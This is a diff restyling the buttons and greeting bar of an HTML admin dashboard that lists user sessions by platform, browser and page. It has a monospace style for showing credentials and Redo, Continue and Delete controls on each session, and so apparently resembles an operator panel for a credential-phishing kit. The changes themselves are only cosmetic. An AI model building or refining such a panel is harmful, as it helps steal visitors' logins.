@@ -26,7 +26,7 @@
       max-width: 1120px;
       margin: 32px auto 0;
       padding: 0 28px;
-      font-size: 25px;          /* same size as stat numbers */
+      font-size: 20px;
       font-weight: 600;
       line-height: 1.05;
     }
@@ -45,14 +45,25 @@
     th { text-align: left; padding: .6rem .5rem; border-bottom: 1px solid #e5e5e5; font-weight: 500; font-size: .8rem; text-transform: uppercase; color: #555; }
     td { padding: .6rem .5rem; border-bottom: 1px solid #f0f0f0; }
     tr:hover { background: #fafafa; }
-    button.grey-box {
-      background: #2b2b2b; border: 1px solid #3c3c3c; color: var(--text-primary);
-      padding: .25rem .6rem; font-size: .8rem; border-radius: 4px; cursor: pointer; margin: 0 2px;
-      transition: background .18s ease;
+
+    /* ----------  CLEAN BUTTONS  ---------- */
+    .btn {
+      padding: .35rem .75rem;
+      font-size: .8rem;
+      border-radius: 6px;
+      border: 1px solid transparent;
+      cursor: pointer;
+      transition: all .18s ease;
     }
-    button.grey-box:hover { background: #333; }
-    button.danger { background: var(--red); border: 1px solid var(--red); }
-    button.danger:hover { background: #e94355; }
+    .btn-outline { background: transparent; border-color: rgba(255,255,255,.2); color: var(--text-primary); }
+    .btn-outline:hover { background: rgba(255,255,255,.05); border-color: rgba(255,255,255,.35); }
+
+    .btn-grey { background: rgba(255,255,255,.08); border-color: rgba(255,255,255,.08); color: var(--text-primary); }
+    .btn-grey:hover { background: rgba(255,255,255,.15); border-color: rgba(255,255,255,.2); }
+
+    .btn-danger { background: var(--red); border-color: var(--red); color: #000; }
+    .btn-danger:hover { background: #e94355; border-color: #e94355; }
+
     .cred { font-family: monospace; font-size: .8rem; background: #f1f1f1; padding: 2px 4px; border-radius: 3px; color:#000; }
     .detail { font-size: 12px; color: var(--text-muted); }
     #modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.75); align-items: center; justify-content: center; }
@@ -63,9 +74,7 @@
 </head>
 <body>
   <!-- ----------  GREETING  ---------- -->
-  <div class="greet-bar">
-    Hello, <span id="userName">admin</span>! • <span id="clock">--:-- --</span>
-  </div>
+  <div class="greet-bar">Hello, <span id="userName">admin</span>! • <span id="clock">--:-- --</span></div>
 
   <div class="dashboard">
     <div class="grid stats">
@@ -89,13 +98,13 @@
   <div id="modal" onclick="if(event.target===this)closeModal()">
     <div class="card">
       <div style="display:flex;justify-content:space-between;align-items:center">
-        <h3 style="margin:0">Session Detail</h3><button onclick="closeModal()">✕</button>
+        <h3 style="margin:0">Session Detail</h3><button onclick="closeModal()" class="btn btn-outline">✕</button>
       </div>
       <div id="modalBody" style="margin-top:1rem;font-size:13px;line-height:1.6"></div>
-      <div style="margin-top:1rem;display:flex;gap:8px">
-        <button id="redoBtn"  class="grey-box" onclick="act('redo',  currentSid)">🔁 Redo</button>
-        <button id="contBtn"  class="grey-box" onclick="act('cont',  currentSid)">✅ Continue</button>
-        <button class="danger" onclick="act('delete',currentSid)">🗑 Delete</button>
+      <div style="margin-top:1.25rem;display:flex;gap:8px">
+        <button id="redoBtn"  class="btn btn-grey"  onclick="act('redo',  currentSid)">🔁 Redo</button>
+        <button id="contBtn"  class="btn btn-grey"  onclick="act('cont',  currentSid)">✅ Continue</button>
+        <button class="btn btn-danger" onclick="act('delete',currentSid)">🗑 Delete</button>
       </div>
     </div>
   </div>
@@ -150,7 +159,7 @@
           <td>${s.platform}</td>
           <td>${s.browser}</td>
           <td>${pageTitle(s.page)}</td>
-          <td><button class="grey-box" onclick="showDetail('${s.sid}')">Manage</button></td>
+          <td><button class="btn btn-outline" onclick="showDetail('${s.sid}')">Manage</button></td>
         </tr>`).join('');
     }
 
